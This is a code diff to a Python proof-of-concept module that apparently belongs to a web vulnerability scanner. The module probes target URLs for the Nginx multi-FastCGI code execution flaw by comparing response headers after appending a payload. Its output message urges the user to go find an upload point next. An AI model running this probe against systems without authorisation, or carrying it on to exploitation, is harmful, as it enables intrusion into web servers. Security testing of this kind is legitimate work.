@@ -12,6 +12,7 @@ import warnings
 from bs4 import BeautifulSoup
 from termcolor import cprint
 
+
 class multi_fastcgi_code_exec_BaseVerify:
     def __init__(self, url):
         self.url = url
@@ -49,25 +50,28 @@ class multi_fastcgi_code_exec_BaseVerify:
             turl = self.catch(self.url)
             if len(turl) != 1:
                 for rurl in turl:
-                    if r"http" not in self.url or r"https" not in self.url: 
-                        rurl = self.url + "/" + rurl 
+                    if r"http" not in self.url or r"https" not in self.url:
+                        rurl = self.url + "/" + rurl
                     vulnurl = rurl + payload
                     html = requests.get(rurl, timeout=10, verify=False)
-                    poc = requests.get(vulnurl + payload, timeout=10, verify=False)
-                    if html.headers["Content-Type"] != poc.headers["Content-Type"]:
-                        cprint("[+]存在Nginx Multi-FastCGI Code Execution漏洞...(高危)\tpayload: "+vulnurl+"\t老大去找上传点吧~", "red")
+                    poc = requests.get(vulnurl + payload,
+                                       timeout=10, verify=False)
+                    if html.headers["Content-Type"] != poc.headers["Content-Type"] and ("Server: nginx" in html.content or "Server: nginx" in poc.content):
+                        cprint(
+                            "[+]存在Nginx Multi-FastCGI Code Execution漏洞...(高危)\tpayload: " + vulnurl + "\t老大去找上传点吧~", "red")
                         break
             else:
                 rurl = ''.join(turl)
                 vulnurl = rurl + payload
                 html = requests.get(rurl, timeout=10, verify=False)
                 poc = requests.get(vulnurl + payload, timeout=10, verify=False)
-                if html.headers["Content-Type"] != poc.headers["Content-Type"]:
-                    cprint("[+]存在Nginx Multi-FastCGI Code Execution漏洞...(高危)\tpayload: "+vulnurl+"\t老大去找上传点吧~", "red")
-
+                if html.headers["Content-Type"] != poc.headers["Content-Type"] and ("Server: nginx" in html.content or "Server: nginx" in poc.content):
+                    cprint("[+]存在Nginx Multi-FastCGI Code Execution漏洞...(高危)\tpayload: " +
+                           vulnurl + "\t老大去找上传点吧~", "red")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] " + __file__ + "====>连接超时", "cyan")
+
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
